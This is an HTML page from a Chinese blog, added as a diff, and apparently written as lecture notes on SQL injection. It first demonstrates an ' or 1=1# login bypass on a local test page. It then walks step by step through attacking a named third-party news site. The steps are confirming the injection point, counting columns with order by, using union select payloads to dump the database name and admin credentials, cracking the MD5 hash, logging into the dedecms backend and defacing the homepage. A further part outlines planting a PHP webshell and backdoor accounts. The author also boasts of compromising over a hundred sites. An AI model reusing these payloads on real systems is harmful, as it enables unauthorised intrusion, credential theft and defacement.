@@ -1,0 +1,1317 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/BlogP32.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/BlogP16.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SQL注入篇一共分为三讲：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全篇之SQL注入攻击">
+<meta property="og:url" content="http://yoursite.com/2019/07/31/Web安全篇之SQL注入攻击/index.html">
+<meta property="og:site_name" content="Sumarua">
+<meta property="og:description" content="SQL注入篇一共分为三讲：">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/31/etfRqH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/31/etR9zD.png">
+<meta property="og:updated_time" content="2019-07-31T07:33:08.824Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全篇之SQL注入攻击">
+<meta name="twitter:description" content="SQL注入篇一共分为三讲：">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/07/31/etfRqH.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sumarua" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/07/31/Web安全篇之SQL注入攻击/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Web安全篇之SQL注入攻击 | Sumarua</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sumarua</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Why Is Power !</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Schlagwörter</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/404/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Suche..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/Web安全篇之SQL注入攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sumarua">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://p1.qqyou.com/touxiang/UploadPic/2015-12/22/719eaa6ec00d16f9dd425e6f7288a49d.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sumarua">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全篇之SQL注入攻击
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-07-31 14:27:31 / Geändert am: 15:33:08" itemprop="dateCreated datePublished" datetime="2019-07-31T14:27:31+08:00">2019-07-31</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SQL注入篇一共分为三讲："><a href="#SQL注入篇一共分为三讲：" class="headerlink" title="SQL注入篇一共分为三讲："></a>SQL注入篇一共分为三讲：</h1><a id="more"></a>
+<p>第一讲：“纸上谈兵：我们需要在本地架设注入环境，构造注入语句，了解注入原理。”；<br>第二讲：“实战演练：我们要在互联网上随机对网站进行友情检测，活学活用，举一反三”；<br>第三讲：“扩展内容：挂马，提权，留门。此讲内容颇具危害性，不予演示。仅作概述”。<br>这个主题涉及的东西还是比较多的，结合我们前期所学。主要是让大家切身体会一下，管中窥豹，起到知己知彼的作用。千里之堤溃于蚁穴，以后进入单位，从事相关程序开发，一定要谨小慎微。</p>
+<h2 id="大家知道骇客们攻击网站主要有哪些手法？"><a href="#大家知道骇客们攻击网站主要有哪些手法？" class="headerlink" title="大家知道骇客们攻击网站主要有哪些手法？"></a>大家知道骇客们攻击网站主要有哪些手法？</h2><p> SQL注入，旁注，XSS跨站，COOKIE欺骗，DDOS，0day 漏洞，社会工程学 等等等等，只要有数据交互，就会存在被入侵风险！哪怕你把网线拔掉，物理隔绝，我还可以利用传感器捕捉电磁辐射信号转换成模拟图像。你把门锁上，我就爬窗户；你把窗户关上，我就翻院墙；你把院墙加高，我就挖地洞。。。道高一尺魔高一丈，我始终坚信计算机不存在绝对的安全，你攻我防，此消彼长，有时候，魔与道只在一念之间。<br>    下面，就让我们一起推开计算机中那另一扇不为人知的门—</p>
+<h2 id="一、纸上谈兵"><a href="#一、纸上谈兵" class="headerlink" title="一、纸上谈兵"></a>一、纸上谈兵</h2><h3 id="（一）了解注入原理"><a href="#（一）了解注入原理" class="headerlink" title="（一）了解注入原理"></a>（一）了解注入原理</h3><pre><code>为什么会存在sql注入呢，只能说SQL出身不好。因为sql作为一种解释型语言，在运行时是由一个运行时组件解释语言代码并执行其中包含的指令的语言。基于这种执行方式，产生了一系列叫做代码注入（code injection）的漏洞 。它的数据其实是由程序员编写的代码和用户提交的数据共同组成的。程序员在web开发时，没有过滤敏感字符，绑定变量，导致攻击者可以通过sql灵活多变的语法，构造精心巧妙的语句，不择手段，达成目的，或者通过系统报错，返回对自己有用的信息。
+我们在学JDBC和SQL时，讲师跟我们说 Statement不能防止SQL注入, PreparedStatement能够防止SQL注入. 没错, 这句话是没有问题的, 但到底如何进行SQL注入?怎么直观的去了解SQL注入?这还是需要花一定的时间去实验的.预编译语句java.sql.PreparedStatement ,扩展自 Statement,不但具有 Statement 的所有能力而且具有更强大的功能。不同的是，PreparedStatement 是在创建语句对象的同时给出要执行的sql语句。这样，sql语句就会被系统进行预编译，执行的速度会有所增加，尤其是在执行大语句的时候，效果更加理想。而且PreparedStatement中绑定的sql语句是可以带参数的。
+</code></pre><h3 id="（二）架设注入环境"><a href="#（二）架设注入环境" class="headerlink" title="（二）架设注入环境"></a>（二）架设注入环境</h3><pre><code>我们知道现在php作为一门网页编程语言真是风生水起，利用lamp(linux+apache+mysql+php)或者wamp(windows+apache+mysql+php)搭建网站环境，如腾讯的discuz、阿里的 phpwind 以及织梦的dedecms 等建站程序,占据了国内网站的半壁江山。那么我们今天即以这种架构为假象敌，首先是在本地架设wamp环境。需要用到的工具有：apache,mysql,php ，这几个组件可以单独下载安装，不过安装配置过程较为繁琐，还是建议新手直接从网上下载phpnow ，一个绿色程序，包含上述三个组件，傻瓜化操作就可以了。
+然后呢，我们要建立测试用的数据表，编写html,php,文件，通过实例具体来演示通过SQL注入，登入后台管理员界面。这里，我之前已经写好了，大家看下：
+</code></pre><h4 id="1-创建一张试验用的数据表："><a href="#1-创建一张试验用的数据表：" class="headerlink" title="1.创建一张试验用的数据表："></a>1.创建一张试验用的数据表：</h4><p>　　</p>
+<pre><code>1CREATE TABLE users (
+2  id int(11) NOT NULL AUTO_INCREMENT,
+3　username varchar(64) NOT NULL,
+4　password varchar(64) NOT NULL,
+5　email varchar(64) NOT NULL,
+6　PRIMARY KEY (id),
+7　UNIQUE KEY username (username)
+8　);
+</code></pre><p>　　<br>　　添加一条记录用于测试：<br>　　INSERT INTO users (username,password,email)<br>　　VALUES(‘tarena’,md5(‘admin’),<a href="mailto:&#39;tarena@admin.com" target="_blank" rel="noopener">&#39;tarena@admin.com</a>‘);
+　　</p>
+<h4 id="2-接下来，贴上登录界面的源代码："><a href="#2-接下来，贴上登录界面的源代码：" class="headerlink" title="2.接下来，贴上登录界面的源代码："></a>2.接下来，贴上登录界面的源代码：</h4><p><img src="https://s2.ax1x.com/2019/07/31/etfRqH.png" alt="源码1"><br>当用户点击提交按钮的时候，将会把表单数据提交给validate.php页面，validate.php页面用来判断用户输入的用户名和密码有没有都符合要求(这一步至关重要，也往往是SQL漏洞所在)。</p>
+<p>3.验证模块代码如下：</p>
+<p><img src="https://s2.ax1x.com/2019/07/31/etR9zD.png" alt="源码2"><br>注意到了没有，我们直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，待会你们将明白，这是致命的。<br>代码分析：如果，用户名和密码都匹配成功的话，将跳转到管理员操作界面(manager.php)，不成功，则给出友好提示信息。</p>
+<h3 id="（三）演示注入手法"><a href="#（三）演示注入手法" class="headerlink" title="（三）演示注入手法　　"></a>（三）演示注入手法　　</h3><p>　　到这里，前期工作已经做好了，我们看这个登录界面，虽说是简陋了点。但具有一般登录认证的功能。普通人看这个不过是一个登录界面，但从攻击者角度来说，透过现象看本质，我们应当意识到隐藏在这个登录页面背后的是一条select 语句—<br>　　OK！ 接下来将展开我们的重头戏：SQL注入<br>　　填好正确的用户名(tarena)和密码(admin)后，点击提交，将会返回给我们“欢迎管理员”的界面。<br>　　因为根据我们提交的用户名和密码被合成到SQL查询语句当中之后是这样的：<br>　　    select <em> from users where username=’tarena’ and password=md5(‘admin’)<br>　　很明显，用户名和密码都和我们之前给出的一样，肯定能够成功登陆。但是，如果我们输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。恩，正常情况下是如此，但是对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。<br>　　比如：在用户名输入框中输入:’or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为：<br>　　    select </em> from users where username=’’ or 1=1#’ and password=md5(‘’)<br>　　语义分析：“#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：<br>　　    select <em> from users where username=’’ or 1=1#’ and password=md5(‘’)<br>　　等价于<br>　　    select </em> from users where username=’’ or 1=1<br>　　因为1=1永远都是成立的，即where子句总是为真，将该sql进一步简化之后，等价如下select语句：<br>　　    select * from users<br>　　没错，该sql语句的作用是检索users表中的所有字段<br>果不其然，我们利用万能语句(’or 1=1#)能够登录！看到了吧，一个经构造后的sql语句竟有如此可怕的破坏力，相信你看到这后，开始对sql注入有了一个理性的认识了吧~</p>
+<h2 id="二、实战演练"><a href="#二、实战演练" class="headerlink" title="二、实战演练"></a>二、实战演练</h2><p>OK,前面铺垫了那么多，算是给大家科普了。现在我们进行第二讲，实战演练。开始之前呢，有一个互动环节。现在请大家用自己的手机登录 <a href="http://www.guoshang.tk" target="_blank" rel="noopener">http://www.guoshang.tk</a>  这个网址，简单看下。待会等我们注入攻击之后，再次登录，好对比效果，对于sql注入攻击有一个更加直观的认识。</p>
+<p>###（一）积极备战<br>1。首先设置浏览器，工具–internet选项–安全–找到“显示友好的http信息”,把前面的勾去掉；<br>2。打开谷歌，寻找注入点。为了节省时间，这里我已经事先找好目标点<br><a href="http://www.guoshang.tk；" target="_blank" rel="noopener">http://www.guoshang.tk；</a><br>谷歌搜索小技巧：筛选关键字：”inurl:/news/read.php?id=”</p>
+<h3 id="（二）狼烟四起"><a href="#（二）狼烟四起" class="headerlink" title="（二）狼烟四起"></a>（二）狼烟四起</h3><h4 id="1。我们打开这个网址，一个新闻网站，-我们点击-百家争鸣-板块，这是一个国内外新闻速览的栏目，好多时政的帖子，我们点击一个，OK，现在进入单个帖子界面，首先我们看下当前帖子的URL地址，"><a href="#1。我们打开这个网址，一个新闻网站，-我们点击-百家争鸣-板块，这是一个国内外新闻速览的栏目，好多时政的帖子，我们点击一个，OK，现在进入单个帖子界面，首先我们看下当前帖子的URL地址，" class="headerlink" title="1。我们打开这个网址，一个新闻网站，,我们点击[百家争鸣]板块，这是一个国内外新闻速览的栏目，好多时政的帖子，我们点击一个，OK，现在进入单个帖子界面，首先我们看下当前帖子的URL地址，"></a>1。我们打开这个网址，一个新闻网站，,我们点击[百家争鸣]板块，这是一个国内外新闻速览的栏目，好多时政的帖子，我们点击一个，OK，现在进入单个帖子界面，首先我们看下当前帖子的URL地址，</h4><p><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a><br>可以看出这是一个动态URL，也就是说可以在地址栏中传参，这是SQL注入的基本条件。</p>
+<h4 id="2。判断是否存在sql注入可能。在帖子地址后面空上一格，敲入-and-1-1-然后-and-1-2-。这两句什么意思呢？-一个恒等式，一个恒不等式，敲入-and-1-1-帖子返回正常，-and-1-2-时帖子返回出错，说明sql语句被执行，程序没有对敏感字符进行过滤。现在我们可以确定此处是一个SQL注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中。可以推断出在访问"><a href="#2。判断是否存在sql注入可能。在帖子地址后面空上一格，敲入-and-1-1-然后-and-1-2-。这两句什么意思呢？-一个恒等式，一个恒不等式，敲入-and-1-1-帖子返回正常，-and-1-2-时帖子返回出错，说明sql语句被执行，程序没有对敏感字符进行过滤。现在我们可以确定此处是一个SQL注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中。可以推断出在访问" class="headerlink" title="2。判断是否存在sql注入可能。在帖子地址后面空上一格，敲入 and 1=1 ,然后 and 1=2 。这两句什么意思呢？ 一个恒等式，一个恒不等式，敲入 and 1=1 帖子返回正常， and 1=2 时帖子返回出错，说明sql语句被执行，程序没有对敏感字符进行过滤。现在我们可以确定此处是一个SQL注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中。可以推断出在访问"></a>2。判断是否存在sql注入可能。在帖子地址后面空上一格，敲入 and 1=1 ,然后 and 1=2 。这两句什么意思呢？ 一个恒等式，一个恒不等式，敲入 and 1=1 帖子返回正常， and 1=2 时帖子返回出错，说明sql语句被执行，程序没有对敏感字符进行过滤。现在我们可以确定此处是一个SQL注入点，程序对带入的参数没有做任何处理，直接带到数据库的查询语句中。可以推断出在访问</h4><p><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a><br>时数据库中执行的SQL语句大概是这样的：<br>Select <em> from [表名] where id=50<br>添加and 1=1后的SQL语句：<br>Select </em> from [表名] where id=50 and 1=1<br>由于条件and 1=1永远为真，所以返回的页面和正常页面是一致的<br>添加and 1=2后的SQL语句：<br>Select * from [表名] where id=50 and 1=2<br>由于条件1=2永远为假，所以返回的页面和正常页面不一致 </p>
+<h4 id="3。爆数据库。确定注入点仅仅意味着开始。现在，我们回到原先的帖子地址："><a href="#3。爆数据库。确定注入点仅仅意味着开始。现在，我们回到原先的帖子地址：" class="headerlink" title="3。爆数据库。确定注入点仅仅意味着开始。现在，我们回到原先的帖子地址："></a>3。爆数据库。确定注入点仅仅意味着开始。现在，我们回到原先的帖子地址：</h4><p><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a><br>现在要判断数据库类型以及版本，构造语句如下：<br><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> and ord(mid(version(),1,1))&gt;51<br>发现返回正常页面，说明数据库是mysql，并且版本大于4.0，支持union查询，反之是4.0<br>以下版本或者其他类型数据库。 </p>
+<h4 id="4。爆字段。接着我们再构造如下语句来猜表中字段："><a href="#4。爆字段。接着我们再构造如下语句来猜表中字段：" class="headerlink" title="4。爆字段。接着我们再构造如下语句来猜表中字段："></a>4。爆字段。接着我们再构造如下语句来猜表中字段：</h4><p>a. <a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> order by 10<br>返回错误页面，说明字段小于10<br>b. <a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> order by 5<br>返回正常页面，说明字段介于5和10之间<br>c. <a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> order by 7<br>返回错误页面，说明字段大于5小于7，可以判断字段数是6.下面我们再来确认一下<br>d. <a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> order by 6<br>返回正常页面，说明字段确实是6这里采用了“二分查找法”，这样可以减少判断次数，节省时间。如果采用从order by 1依次增加数值的方法来判断，需要7次才可以确定字段数，采用“二分查找法”只需要4次就够。当字段数很大时，二分查找法的优势更加明显，效率更高。 </p>
+<h4 id="5。爆表-确定字段之后现在我们要构造联合查询语句-union-select-，语句如下："><a href="#5。爆表-确定字段之后现在我们要构造联合查询语句-union-select-，语句如下：" class="headerlink" title="5。爆表.确定字段之后现在我们要构造联合查询语句(union select )，语句如下："></a>5。爆表.确定字段之后现在我们要构造联合查询语句(union select )，语句如下：</h4><p><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> and 1=2 union select 1,2,3,4,5,6<br>我们来看帖子页面，原先内容没有了，取而代之的是返回给了我们 三个数字，分别是3，5，6 我们随便选择一个，这里的3，5，6指的是我们可以把联合查询的对应位置替换为 我们想要查询的关键字，比如版本，数据库名称，主要是用来探测web系统的信息。</p>
+<h4 id="6。爆用户名、密码。我们选择3-吧，OK-现在把3给替换掉，先查询下数据库库名，构造语句如下"><a href="#6。爆用户名、密码。我们选择3-吧，OK-现在把3给替换掉，先查询下数据库库名，构造语句如下" class="headerlink" title="6。爆用户名、密码。我们选择3 吧，OK,现在把3给替换掉，先查询下数据库库名，构造语句如下"></a>6。爆用户名、密码。我们选择3 吧，OK,现在把3给替换掉，先查询下数据库库名，构造语句如下</h4><p><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> and 1=2 union select                                                                  1,2,database(),4,5,6<br>浏览器给我们返回了 xinwen  。说明这个网站 的数据库库名是 xinwen  .<br>现在我们用同样的手法查询下 管理员信息 ，构造语句如下：<br><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> and 1=2 union select                                                                  1,2,user(),4,5,6<br>返回 root@localhost ，是个管理员权限。<br>现在我们再用同样的手法查询用户名，密码，构造语句如下：<br><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> and 1=2 union select<br>1,2,username,4,5,6 from admin<br>返回 admin<br><a href="http://www.guoshang.tk/news/read.php?id=50" target="_blank" rel="noopener">http://www.guoshang.tk/news/read.php?id=50</a> and 1=2 union select                                                             1,2,password,4,5,6 from admin<br>返回 B2E5B76793EDA747382E81391AA3A400  </p>
+<h4 id="7。md5解密。"><a href="#7。md5解密。" class="headerlink" title="7。md5解密。"></a>7。md5解密。</h4><p>看到这里，有的同学可能会有点紧张。其实返回的这个是字符串密码经过32位md5加密后的值。上次李翊大帝给我们复习的时候 讲过加密与解密。也稍稍提到了md5 摘要算法，不可逆。话虽如此，现在互联网上crack md5 “解密”md5 的网站很多，这里我给解密加了引号，是因为其“解密”原理是 md5 值既然不能进行 逆向破解，但是同样的字符串经过同样的md5加密算法所生成的md5值是一样的，我们可以重新构造字符串生成md5值，然后对比两个值，如果一样则字符串一样。有人说，这种方法岂不是海底捞针，试到猴年马月去啊，其实不然，互联网云时代已经到来，大数据的信息挖掘以及分布式运算可以解决很多类似大运算量的问题。我们现在就要来对这个md5值进行比对，有好多网站提供这种服务，我们找一个。（<a href="http://www.md5.com.cn" target="_blank" rel="noopener">http://www.md5.com.cn</a> ） 这个网址，我们把这个值复制进去，然后点击“MD5 CRACK“，“解密”时间，视密码复杂度而定，OK，结果出来，(chinaadmin)</p>
+<h4 id="8。登录后台。"><a href="#8。登录后台。" class="headerlink" title="8。登录后台。"></a>8。登录后台。</h4><p>现在我们已经拿到网站的管理员帐号密码，感谢上帝，一路顺风，但还不能高兴得太早。很多情况是你虽然拿到了钥匙，但是找不到门。下面我们就来找一下门，找之前要有个基本思路：<br>①先试下几个比较常用的目录；<br>②不行的话，因为这个论坛程序是dedecms5.6 ，所以我们就到 织梦官方，下载一套同样程序，           分析网站管理路径，或者直接百度“dedecms默认管理界面”即可，下载步骤可省略；<br>③手工不通，借力工具。明小子，啊D，御剑，都可以。</p>
+<h4 id="9。这里我们发现此网站依然采用程序默认管理路径："><a href="#9。这里我们发现此网站依然采用程序默认管理路径：" class="headerlink" title="9。这里我们发现此网站依然采用程序默认管理路径："></a>9。这里我们发现此网站依然采用程序默认管理路径：</h4><p><a href="http://www.guoshang.tk/dede" target="_blank" rel="noopener">http://www.guoshang.tk/dede</a><br>输入用户名 admin ，密码 chinaadmin 成功登入。<br>接下来，我们找到【核心】–【附件管理】–【文件式管理器】–这时我们可以看到网站根目录下所有目录以及文件，下标栏还有几个功能选项，我们可以看到网站首页文件【index.html】，点击【修改】，进入网页源代码编辑模式，删除所有源码(这招有点毒，劝告别改人家的源码，建议新建一个文件)，留个言，表示到此一游。<br>卑鄙是卑鄙者的通行证，高尚是高尚者的墓志铭—– 北岛<br>现在是见证奇迹的时刻！请大家再次登录这个网站，有没有把你和你的小伙伴们惊呆呢？！</p>
+<p>至此，战斗结束。若干年的免费住宿，一日三餐在向你招手。。。</p>
+<h2 id="三、扩展部分"><a href="#三、扩展部分" class="headerlink" title="三、扩展部分"></a>三、扩展部分</h2><p>鉴于此讲内容危害性较大，不予演示。只简述其流程。</p>
+<h3 id="（一）webshell提权"><a href="#（一）webshell提权" class="headerlink" title="（一）webshell提权"></a>（一）webshell提权</h3><p>二讲结束，我们仅仅取得网站管理员权限，操作范围仅限当前网站。革命尚未成功，同志仍需努力。若想深入挖掘，则必须寻求更大突破。获得网站webshell .<br>①准备一个php网马。（网上泛滥成灾，自己下载。但要注重分辨，小心螳螂捕蝉黄雀在后）;<br>②登录网站后台–【核心】–【附件管理】–【文件式管理器】–选择下标栏中的【文件上传<br>选项，上传我们实现准备的php网马文件（tarena.php）；<br>③上传完毕，点击预览，记录下url地址。新建浏览器窗口，复制粘贴，打开之后，可以看到我们的网马成功挂载，输入密码tarena(密码可以自行用记事本打开修改编辑)；<br>④进入网马管理界面，你会被那华丽丽的操作选项惊呆了！（取决网马水平，小马就别谈了，这里指的是大马）。从程序目录-网站根目录-各种强大的功能，乃至直接操作服务器磁盘文件，获取各种系统信息，跃马扬鞭，如入无人之境。其破坏力之大，令人咂舌！所以拜托各位亲，一定要盗亦有道，手下留情，除了靠法律监管，也要靠个人道德约束。</p>
+<h3 id="（二）暗修栈道"><a href="#（二）暗修栈道" class="headerlink" title="（二）暗修栈道"></a>（二）暗修栈道</h3><p>浴血奋战、攻城拔寨之后，怎样保卫来之不易的胜利果实？政治治大国若烹小鲜，入侵则烹小鲜如治大国。为长远计，我们需要建立一种长期和肉鸡保持联系的机制。而且还要很隐蔽，毕竟这是见不得光的。留后门的方法诸多：<br>①开启telnet服务<br>建立匿名账户，添加至超级管理员组；<br>②开启远程终端服务；<br>③自制木马触发事件…<br>因系统平台而异，这里不再赘言。</p>
+<h2 id="后注："><a href="#后注：" class="headerlink" title="后注："></a>后注：</h2><p>①可能有读者会觉得此文很假，的确，鉴于篇幅问题，文中目标站点是我事先踩点过的，所以才<br>会一路凯歌，事实上很少会有站点会如此理想，但万变不离其宗，只是时间问题罢了。<br>②文中所述演示环境建立在同时满足两个条件下：<br>1.php配置文件中魔术引号已关闭；<br>2.建站程序中没有对用户输入字符进行过滤。</p>
+<p>实际生活中，类似的SQL注入漏洞已是明日黄花，国内大大小小的网站都已经补上漏洞。但，百密必有一疏，入侵是偶然的，但安全绝对不是必然的。笔者曾在晨讲之前利用了一天的时间，采取手工加工具的手段批量扫描了一批站点，并最终成功攻克一百有余。其中SQL注入漏洞确实很少，但各类0day漏洞层出不穷，更为严重的是后者比前者更加致命，互联网的高速发展给人们带来便利的同时也潜伏着非常多的风险，目前国内网络安全领域人才缺口非常大！希望达内能够审时度势，占领市场先机，早日开设网络安全专业，为社会经济建设保驾护航</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Beitragsautor:  </strong>Sumarua</li>
+  <li class="post-copyright-link">
+    <strong>Beitragslink: </strong>
+    
+    <a href="http://yoursite.com/2019/07/31/Web安全篇之SQL注入攻击/" title="Web安全篇之SQL注入攻击">http://yoursite.com/2019/07/31/Web安全篇之SQL注入攻击/</a>
+  </li>
+  <li class="post-copyright-license">
